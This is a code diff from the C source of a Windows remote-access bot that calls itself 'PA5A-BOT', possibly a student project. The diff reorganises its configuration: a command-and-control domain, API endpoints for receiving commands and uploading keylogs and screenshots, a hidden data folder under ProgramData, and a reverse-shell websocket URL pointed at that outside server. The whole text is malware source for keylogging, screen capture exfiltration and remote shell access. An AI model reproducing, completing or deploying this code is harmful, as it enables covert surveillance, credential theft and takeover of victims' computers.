@@ -12,19 +12,40 @@ EXTERN_C_START
 #include <WinInet.h>
 #include <strsafe.h>
 #include <Psapi.h>
-#include <cjson/cJSON.h>
-#include "mongoose.hpp"
-
+#include "cjson/cJSON.h"
+#include "mongoose/mongoose.h"
 
 #pragma comment(lib, "gdiplus")
 #pragma comment(lib, "crypt32")
 #pragma comment(lib, "wininet")
 #pragma comment(lib, "ws2_32")
 
+/******************************CONFIGURATION******************************/
+//Pour afficher les informations de debogage
+#define DEBUG
+//#pragma warning(disable : 4996)
+
+#define DATA_FOLDER_A		"C:\\ProgramData\\PA5A\\"
+#define DATA_FOLDER_W		L"C:\\ProgramData\\PA5A\\"
+#define SCREENSHOT_FILE_W	L"screenshot.jpeg"
+#define SERVER_NAME_A		"pa5a.cyberfilou.site"
+#define SERVER_NAME_W		L"pa5a.cyberfilou.site"
+#define USER_AGENT_A		"PA5A-BOT"
+#define USER_AGENT_W		L"PA5A-BOT"
+#define HTTP_PORT			80
+#define HTTPS_PORT			443
+#define CLIENT_API_A		"/api/clients/"
+#define COMMANDS_API_A		"/commands"
+#define KEYLOGS_API_A		"/keylogs"
+#define SCREENSHOT_API_A	"/screenshot"
+#define PATH_SIZE			2048
+#define URL_SIZE			4096
+#define UUID_SIZE			256
+#define COMPUTER_NAME_SIZE	256
+
 
 /******************************REVERSE SHELL******************************/
-
-#define SERVER_HOSTNAME "ws://192.168.1.51:8000"
+#define WS_SERVER_URL "ws://" SERVER_NAME_A "/reverseshell"
 #define BUFSIZE 4096
 
 //Structure for reverse shell
@@ -60,30 +81,6 @@ static void event_handler(struct mg_connection* c, int ev, void* ev_data, void* 
 
 
 /******************************MAIN******************************/
-
-//Pour afficher les informations de debogage
-#define DEBUG
-//#pragma warning(disable : 4996)
-
-#define DATA_FOLDER_A		"C:\\ProgramData\\PA5A\\"
-#define DATA_FOLDER_W		L"C:\\ProgramData\\PA5A\\"
-#define SCREENSHOT_FILE_W	L"screenshot.jpeg"
-#define SERVER_NAME_A		"pa5a.cyberfilou.site"
-#define SERVER_NAME_W		L"pa5a.cyberfilou.site"
-#define USER_AGENT_A		"PA5A-BOT"
-#define USER_AGENT_W		L"PA5A-BOT"
-#define HTTP_PORT			80
-#define HTTPS_PORT			443
-#define CLIENT_API_A		"/api/clients/"
-#define COMMANDS_API_A		"/commands"
-#define KEYLOGS_API_A		"/keylogs"
-#define SCREENSHOT_API_A	"/screenshot"
-#define PATH_SIZE			2048
-#define URL_SIZE			4096
-#define UUID_SIZE			256
-#define COMPUTER_NAME_SIZE	256
-
-
 typedef struct Commands
 {
 	BOOL keylogs;
